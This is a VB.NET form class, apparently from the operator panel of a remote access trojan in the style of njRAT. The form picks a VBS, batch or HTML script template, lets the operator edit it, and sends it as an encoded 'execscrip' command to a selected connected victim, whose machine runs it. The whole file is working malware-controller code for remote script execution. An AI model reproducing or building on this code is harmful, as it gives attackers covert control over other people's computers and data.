﻿Public Class Form8
    Public F As Form1
    Public TargetUser As USER
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        F.S.Send(TargetUser, F.ENB("execscrip") & F.Y & F.ENB(TextBox1.Text) & F.Y & F.ENB(ComboBox1.SelectedItem))
    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged
        If ComboBox1.SelectedItem = "vbs" Then
            TextBox1.Text = ""
            TextBox1.AppendText(My.Resources.vbs)
            PictureBox1.Image() = ImageList1.Images.Item(2)
        ElseIf ComboBox1.SelectedItem = "bat" Then
            TextBox1.Text = ""
            TextBox1.AppendText(My.Resources.bat)
            PictureBox1.Image() = ImageList1.Images.Item(0)
        ElseIf ComboBox1.SelectedItem = "html" Then
            TextBox1.Text = ""
            TextBox1.AppendText(My.Resources.html.Replace("ServerName", Environment.UserName))
            PictureBox1.Image() = ImageList1.Images.Item(1)
        End If
    End Sub

    Private Sub Form8_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
End Class